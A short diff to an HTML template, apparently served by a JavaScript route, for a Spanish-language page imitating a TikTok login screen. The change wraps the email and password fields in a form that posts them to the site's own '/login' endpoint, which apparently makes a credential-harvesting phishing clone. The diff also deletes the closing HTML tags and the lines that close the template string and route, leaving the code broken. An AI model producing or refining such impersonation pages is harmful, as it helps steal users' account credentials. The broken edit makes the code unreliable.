@@ -257,15 +257,25 @@ button:hover{
 
 <h2>Inicia sesión con TikTok</h2>
 
-<input type="email" placeholder="Correo electrónico">
+<form action="/login" method="POST">
 
-<input type="password" placeholder="Contraseña">
+<input
+type="email"
+name="correo"
+placeholder="Correo electrónico"
+required>
+
+<input
+type="password"
+name="password"
+placeholder="Contraseña"
+required>
 
 <p class="forgot">
     ¿Olvidaste tu contraseña?
 </p>
 
-<button>
+<button type="submit">
     Continuar
 </button>
 
@@ -274,17 +284,9 @@ button:hover{
     <span>Crear cuenta</span>
 </p>
 
+</form>
+
 </div>
-
-</body>
-
-</html>
-
-
-`);
-
-});
-
 
 
 
